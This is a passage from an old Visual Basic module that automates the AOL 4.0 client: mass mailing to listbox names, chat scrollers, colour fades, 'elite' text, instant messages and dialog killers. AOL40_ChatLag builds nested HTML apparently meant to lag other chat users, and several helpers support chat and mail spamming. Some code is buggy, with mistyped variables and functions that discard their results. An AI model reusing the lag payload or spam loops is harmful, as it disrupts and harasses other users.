edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
Call SendMessageByString(edit%, WM_SETTEXT, 0, Subject)
Call SendMessageByString(Rich%, WM_SETTEXT, 0, Message)
For GetIcon = 1 To 18
icon3% = GetWindow(icon3%, GW_HWNDNEXT)
Next GetIcon
Call ClickIcon(icon3%)
End Sub
Sub AOL40_Mail_SendMailList(SN, Subject, ListBox As ListBox)
' This will open a new email and then enter in all the items from
' the given listbox in the boddy of the message.
tool% = FindChildByClass(AOLWin(), "AOL Toolbar")
toolba2r% = FindChildByClass(tool%, "_AOL_Toolbar")
Icon2% = FindChildByClass(toolbar2%, "_AOL_Icon")
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Call ClickIcon(Icon2%)
Do: DoEvents
Mail% = FindChildByTitle(AOLMDI(), "Write Mail")
edit% = FindChildByClass(Mail%, "_AOL_Edit")
Rich% = FindChildByClass(Mail%, "RICHCNTL")
Icon2% = FindChildByClass(Mail%, "_AOL_ICON")
Loop Until Mail% <> 0 And edit% <> 0 And Rich% <> 0 And Icon2% <> 0
Call SendMessageByString(edit%, WM_SETTEXT, 0, SN)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
Call SendMessageByString(edit%, WM_SETTEXT, 0, Subject)
MailNumber$ = ListBox.ListCount
MailNumber$ = MailNumber$ - 1
For i = 0 To ListBox.ListCount - 1
    MailName$ = ListBox.List(i)
    mailnumwithname$ = MailNumber$ & " )   " & MailName$
    Call SendMessageByString(Rich%, WM_SETTEXT, 0, mailnumwithname$)
    Call SendMessageByString(Rich%, WM_SETTEXT, 0, EnterKey)
    MailNumber$ = MailNumber$ - 1
Next i
For GetIcon = 1 To 18
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Next GetIcon
Call ClickIcon(Icon2%)
End Sub
Function AOL40_Mail_NamesListForBCC(Lst As ListBox) As String
' this will add the names in a listbox to a string to
' send them emails and when mail is sent its BCC
For i = 0 To Lst.ListCount - 1
    Final$ = Final$ & "," & Lst.List(i)
    Next i
AOL40_Mail_NamesListForBCC = "( " & Final$ & " )"
End Function
Sub AOL40_Mail_Minimize_FlashMail()
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
hWndMail = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
X = ShowWindow(hWndMail, SW_MINIMIZE)
End Sub
Sub AOL40_Mail_Restore_FlashMail()
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
hWndMail = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
X = ShowWindow(hWndMail, SW_RESTORE)
End Sub
Sub AOL40_Mail_Minimize_MailBox()
AOL% = FindWindow("AOL Frame25", vbNullString)
aolmd% = FindChildByClass(AOL%, "MDIClient")
themail% = FindChildByClass(aolmd%, "AOL Child")
X = ShowWindow(themail%, SW_MINIMIZE)
End Sub
Sub AOL40_Mail_Restore_MailBox()
AOL% = FindWindow("AOL Frame25", vbNullString)
aolmd% = FindChildByClass(AOL%, "MDIClient")
themail% = FindChildByClass(aolmd%, "AOL Child")
X = ShowWindow(themail%, SW_RESTORE)
End Sub
Function AOL40_Mail_NamesList(Lst As ListBox) As String
' this will add the names in a listbox to a string to
' send them emails
For i = 0 To Lst.ListCount - 1
    Final$ = Final$ & "," & Lst.List(i)
    Next i
AOL40_Mail_NamesList = "" & Final$ & ""
End Function
Function AOL40_Mail_CountFlash()
' This will count the mails in your flash mailbox
' only if your flashmailbox is open
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
hWndMail = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
hWndMailLB = FindChildByClass(hWndMail, "_AOL_Tree")
AOL40_Mail_CountFlash = SendMessageByNum(hWndMailLB, LB_GETCOUNT, 0&, 0&)
End Function

Sub AOL40_Mail_OpenFlashMailNumber(Number)
' this will open the number of mail in your flash mail that you
' specify. Your Flashmail Box has to be open for this to work.
' Call AOL40_Mail_OpenFlashMailNumber(0)  will open first email
' Call AOL40_Mail_OpenFlashMailNumber(1)  will open second email
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, "Incoming/Saved Mail")
AOLTree% = FindChildByClass(Mail%, "_AOL_Tree")
temp = SendMessageByNum(AOLTree%, LB_SETCURSEL, Number, Number)
e = FindChildByClass(Mail%, "_AOL_Icon")
ClickIcon (e)
End Sub
Sub AOL40_Mail_OpenNewMailNumber(Number)
' this will open the number of mail in your new mail that you
' specify. Your New Box has to be open for this to work.
' Call AOL40_Mail_OpenNewMailNumber(0)  will open first email
' Call AOL40_Mail_OpenNewMailNumber(1)  will open second email
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOL40_UserSN + "'s Online Mailbox")
AOLTree% = FindChildByClass(Mail%, "_AOL_TabPage")
temp = SendMessageByNum(AOLTree%, LB_SETCURSEL, 5, 5)
e = FindChildByClass(Mail%, "_AOL_Icon")
ClickIcon (e)
End Sub

Public Function AOL40_RoomFull()
Do
TimeOut 0.00002
msg1% = FindWindow("#32770", "America Online")
Button2% = FindChildByClass(msg1%, "Button")
Stat% = FindChildByClass(msg1%, "Static")
statcap% = FindChildByTitle(msg1%, "The room you requested is full.")
If Stat% <> 0 And Button2% <> 0 And statcap% <> 0 Then Call ClickIcon(Button2%)
Loop Until msg1% = 0
End Function

Function AOL40_GetChatText()
room% = AOL40_FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
ChatText$ = GetText(AORich%)
AOL40_GetChatText = ChatText$
End Function
Function AOL40_FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
room% = FindChildByClass(MDI%, "AOL Child")
STUFF% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If STUFF% <> 0 And MoreStuff% <> 0 Then
   AOL40_FindChatRoom = room%
Else:
   AOL40_FindChatRoom = 0
End If
End Function

Function AOL40_ChatLag(thetext As String)
G$ = thetext$
A = Len(G$)
For W = 1 To A Step 3
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html><pre><html><pre><html>" & r$ & "</html></pre></html></pre></html></pre>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html>" & S$ & "</html></pre>"
Next W
AOL40_ChatLag = p$
End Function
Function AOL40_ChatLink(link, Txt)
AOLSendChat ("< a href=" + link + ">" + Txt + "</a>")
End Function
Sub SendCharNum(win, chars)
e = SendMessageByNum(win, WM_CHAR, chars, 0)
End Sub
Function AOL40_ChatLink2(link, Txt)
' this is just for my prog ;)
SendChat ("<b><--^v^ < a href=" + link + ">" + Txt + "</a>")
End Function
Sub AOL40_ChatIgnore(SN%)
room% = AOL40_FindChatRoom
List% = FindChildByClass(room%, "_AOL_Listbox")
End Sub
Sub AOL40_Spiral(Txt As TextBox)
'Spiral Scroller
X = Txt.text
thastart:
Dim MYLEN As Integer
MyString = Txt.text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
Txt.text = MYSTR
TimeOut 1
SendChat Txt
If Txt.text = X Then
Exit Sub
End If
GoTo thastart
End Sub
Sub AOL40_SpiralScroll(Txt As TextBox)
X = Txt.text
thastar:
Dim MYLEN As Integer
MyString = Txt.text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
Txt.text = MYSTR
SendChat "•[" + Txt + "]•"
If Txt.text = X Then
Exit Sub
End If
GoTo thastar

End Sub
Function AOL40_SpiralText(sBuffer$)
K$ = sBuffer
DeLTa:
Dim MYLEN As Integer
MyString$ = sBuffer$
MYLEN = Len(MyString$)
MYSTR$ = Mid(MyString$, 2, MYLEN) + Mid(MyString$, 1, 1)
sBuffer$ = MYSTR$
TimeOut 1
If sBuffer$ = K$ Then
AOL40_SpiralText = K$: Exit Function
End If
GoTo DeLTa
End Function

Function AOL40_UserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOL40_UserSN = User
End Function
Sub killwait()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AoIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")
For GetIcon = 1 To 19
    AoIcon% = GetWindow(AoIcon%, 2)
Next GetIcon
Call TimeOut(0.05)
ClickIcon (AoIcon%)
Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0
Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Sub prevent()
' Only Allows one version of you progg to run at a time
'Like AOL
If App.PrevInstance Then End
End Sub
Function AOL40_RoomCount()
Dim Chat%
Chat% = AOL40_FindChatRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOL40_RoomCount = Count%
End Function
Sub AOL40_encripter(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    ' lower case letters
    If letter$ = "a" Then leet$ = "†"
    If letter$ = "b" Then leet$ = "õ"
    If letter$ = "c" Then leet$ = "ð"
    If letter$ = "d" Then leet$ = "ô"
    If letter$ = "e" Then leet$ = "î"
    If letter$ = "f" Then leet$ = "ï"
    If letter$ = "g" Then leet$ = "ì"
    If letter$ = "h" Then leet$ = "é"
    If letter$ = "i" Then leet$ = "ê"
    If letter$ = "j" Then leet$ = "ë"
    If letter$ = "k" Then leet$ = "ä"
    If letter$ = "l" Then leet$ = "å"
    If letter$ = "m" Then leet$ = "â"
    If letter$ = "n" Then leet$ = "ù"
    If letter$ = "o" Then leet$ = "û"
    If letter$ = "p" Then leet$ = "ü"
    If letter$ = "q" Then leet$ = "ç"
    If letter$ = "r" Then leet$ = "ñ"
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "v"
    If letter$ = "u" Then leet$ = "ÿ"
    If letter$ = "v" Then leet$ = "Ø"
    If letter$ = "w" Then leet$ = "£"
    If letter$ = "x" Then leet$ = "¹"
    If letter$ = "y" Then leet$ = "©"
    If letter$ = "z" Then leet$ = "#"
    ' upercase letters
    If letter$ = "A" Then leet$ = "Ï"
    If letter$ = "B" Then leet$ = "Î"
    If letter$ = "C" Then leet$ = "Í"
    If letter$ = "D" Then leet$ = "ß"
    If letter$ = "E" Then leet$ = "Ç"
    If letter$ = "F" Then leet$ = "Å"
    If letter$ = "G" Then leet$ = "Ä"
    If letter$ = "H" Then leet$ = "Ã"
    If letter$ = "I" Then leet$ = "Ð"
    If letter$ = "J" Then leet$ = "Ë"
    If letter$ = "K" Then leet$ = "S"
    If letter$ = "L" Then leet$ = "&"
    If letter$ = "M" Then leet$ = "Y"
    If letter$ = "N" Then leet$ = "W"
    If letter$ = "O" Then leet$ = ">"
    If letter$ = "P" Then leet$ = "<"
    If letter$ = "Q" Then leet$ = "Š"
    If letter$ = "R" Then leet$ = "Û"
    If letter$ = "S" Then leet$ = "+"
    If letter$ = "T" Then leet$ = "="
    If letter$ = "U" Then leet$ = "@"
    If letter$ = "V" Then leet$ = "Ñ"
    If letter$ = "W" Then leet$ = "%"
    If letter$ = "X" Then leet$ = "*"
    If letter$ = "Y" Then leet$ = "Õ"
    If letter$ = "Z" Then leet$ = "~"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
End Sub
Sub AOL40_decripter(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "¿" Then leet$ = " "
    If letter$ = "†" Then leet$ = "a"
    If letter$ = "õ" Then leet$ = "b"
    If letter$ = "ð" Then leet$ = "c"
    If letter$ = "ô" Then leet$ = "d"
    If letter$ = "î" Then leet$ = "e"
    If letter$ = "ï" Then leet$ = "f"
    If letter$ = "ì" Then leet$ = "g"
    If letter$ = "é" Then leet$ = "h"
    If letter$ = "ê" Then leet$ = "i"
    If letter$ = "ë" Then leet$ = "j"
    If letter$ = "ä" Then leet$ = "k"
    If letter$ = "å" Then leet$ = "l"
    If letter$ = "â" Then leet$ = "m"
    If letter$ = "ù" Then leet$ = "n"
    If letter$ = "û" Then leet$ = "o"
    If letter$ = "ü" Then leet$ = "p"
    If letter$ = "ç" Then leet$ = "q"
    If letter$ = "ñ" Then leet$ = "r"
    If letter$ = "š" Then leet$ = "s"
    If letter$ = "v" Then leet$ = "t"
    If letter$ = "ÿ" Then leet$ = "u"
    If letter$ = "Ø" Then leet$ = "v"
    If letter$ = "£" Then leet$ = "w"
    If letter$ = "¹" Then leet$ = "x"
    If letter$ = "©" Then leet$ = "y"
    If letter$ = "#" Then leet$ = "z"
    ' upercase letters
    If letter$ = "Ï" Then leet$ = "A"
    If letter$ = "Î" Then leet$ = "B"
    If letter$ = "Í" Then leet$ = "C"
    If letter$ = "ß" Then leet$ = "D"
    If letter$ = "Ç" Then leet$ = "E"
    If letter$ = "Å" Then leet$ = "F"
    If letter$ = "Ä" Then leet$ = "G"
    If letter$ = "Ã" Then leet$ = "H"
    If letter$ = "Ð" Then leet$ = "I"
    If letter$ = "Ë" Then leet$ = "J"
    If letter$ = "S" Then leet$ = "K"
    If letter$ = "&" Then leet$ = "L"
    If letter$ = "Y" Then leet$ = "M"
    If letter$ = "W" Then leet$ = "N"
    If letter$ = ">" Then leet$ = "O"
    If letter$ = "<" Then leet$ = "P"
    If letter$ = "Š" Then leet$ = "Q"
    If letter$ = "Û" Then leet$ = "R"
    If letter$ = "+" Then leet$ = "S"
    If letter$ = "=" Then leet$ = "T"
    If letter$ = "@" Then leet$ = "U"
    If letter$ = "Ñ" Then leet$ = "V"
    If letter$ = "%" Then leet$ = "W"
    If letter$ = "*" Then leet$ = "X"
    If letter$ = "Õ" Then leet$ = "Y"
    If letter$ = "~" Then leet$ = "Z"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
End Sub
Sub AOL40_elitetalker(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "d" Then leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If letter$ = "`" Then leet$ = "´"
    If letter$ = "!" Then leet$ = "¡"
    If letter$ = "?" Then leet$ = "¿"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
SendChat (Made$)
End Sub

Sub WAVStop()
'This will stop a WAV that is playing
Call WAVPlay(" ")
End Sub

Sub WAVLoop(file)
'This will play the WAV you want over and over
SoundName$ = file
wFlags% = SND_ASYNC Or SND_LOOP
X = sndPlaySound(SoundName$, wFlags%)
End Sub
Sub WAVPlay(file)
'This will play a WAV file
SoundName$ = file
wFlags% = SND_ASYNC Or SND_NODEFAULT
X = sndPlaySound(SoundName$, wFlags%)
End Sub
Function WinCaption(win)
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndLength%, 0)
getwintext2% = GetWindowText(win, WinTitle$, (WinTextLength% + 1))
WinCaption = WinTitle$
End Function
Function AOL40_GetCurrentRoomName()
AOL4_GetCurrentRoomName = GetCaption(AOL4_FindRoom)
End Function
Function GetCaption(hWnd)
hwndLength% = GetWindowTextLength(hWnd)
hWndTitle$ = String$(hwndLength%, 0)
A% = GetWindowTextB(hWnd, hWndTitle$, (hwndLength% + 1))

GetCaption = hWndTitle$
End Function
Function AOLGetCurrentRoomName()
X = GetCaption(FindChatRoom())
AOLGetCurrentRoomName = X
End Function
Sub Draw3DBorder(c As Control, iLook As Integer)
'makes a 3d boreder around controls like textboxs...
Dim iOldScaleMode As Integer
Dim iFirstColor As Integer
Dim iSecondColor As Integer

    If iLook = RAISED Then
        iFirstColor = 15
        iSecondColor = 8
    Else
        iFirstColor = 8
        iSecondColor = 15
    End If

    iOldScaleMode = c.Parent.ScaleMode
    c.Parent.ScaleMode = pixels
    c.Parent.Line (c.Left, c.Top - 1)-(c.Left + c.Width, c.Top - 1), QBColor(iFirstColor)
    c.Parent.Line (c.Left - 1, c.Top)-(c.Left - 1, c.Top + c.Height), QBColor(iFirstColor)
    c.Parent.Line (c.Left + c.Width, c.Top)-(c.Left + c.Width, c.Top + c.Height), QBColor(iSecondColor)
    c.Parent.Line (c.Left, c.Top + c.Height)-(c.Left + c.Width, c.Top + c.Height), QBColor(iSecondColor)
    c.Parent.ScaleMode = iOldScaleMode
End Sub
Sub LoadFileInTextbox(FilePath As String, text As TextBox)
'this will load a file into a textbox

Dim A As String
    Open FilePath For Input As 1
    A = Input(LOF(1), 1)
    Close 1
    text = A
End Sub
Function UntilWindowClass(parentw, childhand)
'this will make your program wait untill
'a certin window is found, by class
GoBack:
DoEvents
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
GoTo GoBack
FindClassLike = 0

bone:
room% = firs%
UntilWindowClass = room%
End Function

Function UntilWindowTitle(parentw, childhand)
'this will make your program wait untill
'a certin window is found by its tilte
GoBac:
DoEvents
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
Wend
GoTo GoBac


bone:
room% = firs%
UntilWindowTitle = room%

End Function
Function FadeCustom(thetext As String, Hx1 As Integer, Hx2 As Integer, Hx3 As Integer, Hx4 As Integer, Hx5 As Integer, Hx6 As Integer, Hx7 As Integer, Hx8 As Integer, Hx9 As Integer, Hx10 As Integer)
'Dont worry this is 18 hexes that can
'Be entered but I made it 10 CuZ
'it goes: 1,2,3,4,5,6,7,8,9,10,9,8,7,6,5,4,3,2
'this is so when it fades it will loop
'I entered this so you wouldnt have to delete and
'myne and edit your own or figure out how to
'a new sub
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    l$ = Mid$(thetext, W + 5, 1)
    f$ = Mid$(thetext, W + 6, 1)
    b$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    h$ = Mid$(thetext, W + 10, 1)
    j$ = Mid$(thetext, W + 11, 1)
    K$ = Mid$(thetext, W + 12, 1)
    M$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#" & Hex1 & ">" & ab$ & "<FONT COLOR=#" & Hx2 & ">" & U$ & "<FONT COLOR=#" & Hx3 & ">" & S$ & "<FONT COLOR=#" & Hx4 & ">" & T$ & "<FONT COLOR=#" & Hx5 & ">" & Y$ & "<FONT COLOR=#" & Hx6 & ">" & l$ & "<FONT COLOR=#" & Hx7 & ">" & f$ & "<FONT COLOR=#" & Hx8 & ">" & b$ & "<FONT COLOR=#" & Hx9 & ">" & c$ & "<FONT COLOR=#" & Hx10 & ">" & D$ & "<FONT COLOR=#" & Hx9 & ">" & h$ & "<FONT COLOR=#" & Hx8 & ">" & j$ & "<FONT COLOR=#" & Hx7 & ">" & K$ & "<FONT COLOR=#" & Hx6 & ">" & M$ & "<FONT COLOR=#" & Hx5 & ">" & n$ & "<FONT COLOR=#" & Hx4 & ">" & Q$ & "<FONT COLOR=#" & Hx3 & ">" & V$ & "<FONT COLOR=#" & Hx2 & ">" & Z$
Next W
FadeCustom = PC$

End Function
Sub FormFireFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub
Function MakeHexString(Number As Variant) As String

' Takes a number and Makes a Hexadecimal
' 2 letter string out of it

HxNumber$ = Hex$(Number)

Select Case (HxNumber$)

    Case "0"
    HxNumber$ = "00"
    
    Case "1"
    HxNumber$ = "01"
    
    Case "2"
    HxNumber$ = "02"
    
    Case "3"
    HxNumber$ = "03"
    
    Case "4"
    HxNumber$ = "04"
    
    Case "5"
    HxNumber$ = "05"
    
    Case "6"
    HxNumber$ = "06"
    
    Case "7"
    HxNumber$ = "07"
    
    Case "8"
    HxNumber$ = "08"
    
    Case "9"
    HxNumber$ = "09"
    
    Case "A"
    HxNumber$ = "0A"
    
    Case "B"
    HxNumber$ = "0B"
    
    Case "C"
    HxNumber$ = "0C"
    
    Case "D"
    HxNumber$ = "0D"
    
    Case "E"
    HxNumber$ = "0E"
    
    Case "F"
    HxNumber$ = "0F"
    
'    Case Else
'    HxNumber$ = HexNumber$
    
End Select

MakeHexString = HxNumber$

End Function
Sub blue(TextToSend As String)
SendChat ("<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" + TextToSend)
End Sub
Sub purple(TextToSend As String)
SendChat ("<FONT COLOR=" & Chr$(34) & "#FF00FF" & Chr$(34) & ">" + TextToSend)
End Sub
Sub yellow(TextToSend As String)
SendChat ("<FONT COLOR=" & Chr$(34) & "#FFFF00" & Chr$(34) & ">" + TextToSend)
End Sub


Sub red(TextToSend As String)
SendChat ("<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" + TextToSend)
End Sub
Sub green(TextToSend As String)
SendChat ("<FONT COLOR=" & Chr$(34) & "#00FF00" & Chr$(34) & ">" + TextToSend)
End Sub

Sub FontScroll(Font As String, TextToScroll As String)
SendChat ("<Font face=" + Chr(34) + Font + Chr(34) + ">" + TextToScroll)
End Sub
Sub FontIM(Recipient As String, Font As String, TextToSend As String)
Call IMsend(Recipient, "<Font face=" + Chr(34) + Font + Chr(34) + ">" + TextToSend)
End Sub
Sub ChatSounds(sound As String)
SendChat ("{S " + sound + "}")
End Sub
Sub Ao4Click(Button%)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub

Sub Ao4InstantMessage(person, Message)

aa% = FindWindow("Aol Frame25", 0&)
A% = FindChildByTitle(aa%, "Buddy List Window")
b% = FindChildByClass(A%, "_Aol_Icon")
If A% = 0 Then Ao4KW "Buddy View"
Do
A% = FindChildByTitle(aa%, "Buddy List Window")
b% = FindChildByClass(A%, "_Aol_Icon")
Call Pause(0.001)
Loop Until A% <> 0
c% = GetWindow(b%, GW_HWNDNEXT)
D% = GetWindow(c%, GW_HWNDNEXT)
e% = GetWindow(D%, GW_HWNDNEXT)
Ao4Click D%
Do

'instant message part
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
AOLEdit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
If AOLEdit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop

Call AOLSetText(AOLEdit%, person)
Call AOLSetText(aolrich%, Message)
IMsend2% = FindChildByClass(im%, "_AOL_Icon")

For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, 2)
Next sends

AOLIcon (IMsend2%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(im%, WM_CLOSE, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
End Sub

Sub Ao4Kill45min()
Do
A% = FindWindow("_Aol_Palette", 0&)
b% = FindChildByClass(A%, "_Aol_Icon")
Call Pause(0.001)
Loop Until b% <> 0
Ao4Click (b%)
End Sub

Sub Ao4KW(Where$)
b% = FindWindow("Aol Frame25", 0&)
A% = FindChildByClass(b%, "_Aol_Toolbar")
c% = FindChildByClass(A%, "_Aol_Icon")
D% = GetWindow(c%, GW_HWNDNEXT)
e% = GetWindow(D%, GW_HWNDNEXT)
f% = GetWindow(e%, GW_HWNDNEXT)
G% = GetWindow(f%, GW_HWNDNEXT)
h% = GetWindow(G%, GW_HWNDNEXT)
i% = GetWindow(h%, GW_HWNDNEXT)
j% = GetWindow(i%, GW_HWNDNEXT)
K% = GetWindow(j%, GW_HWNDNEXT)
l% = GetWindow(K%, GW_HWNDNEXT)
M% = GetWindow(l%, GW_HWNDNEXT)
n% = GetWindow(M%, GW_HWNDNEXT)
O% = GetWindow(n%, GW_HWNDNEXT)
p% = GetWindow(O%, GW_HWNDNEXT)
Q% = GetWindow(p%, GW_HWNDNEXT)
r% = GetWindow(Q%, GW_HWNDNEXT)
S% = GetWindow(r%, GW_HWNDNEXT)
T% = GetWindow(S%, GW_HWNDNEXT)
U% = GetWindow(T%, GW_HWNDNEXT)
V% = GetWindow(U%, GW_HWNDNEXT)
W% = GetWindow(U%, GW_HWNDNEXT)
Y% = GetWindow(W%, GW_HWNDNEXT)
Ao4Click Y%
Do
